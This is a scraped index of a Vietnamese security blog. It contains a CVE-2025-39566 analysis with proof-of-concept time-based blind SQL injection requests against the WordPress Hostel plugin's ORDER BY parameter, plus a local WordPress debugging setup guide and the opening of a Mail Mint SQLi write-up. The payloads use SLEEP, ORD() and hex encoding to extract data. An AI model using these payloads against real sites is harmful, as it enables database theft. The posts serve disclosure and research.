Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress and Debugging Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± 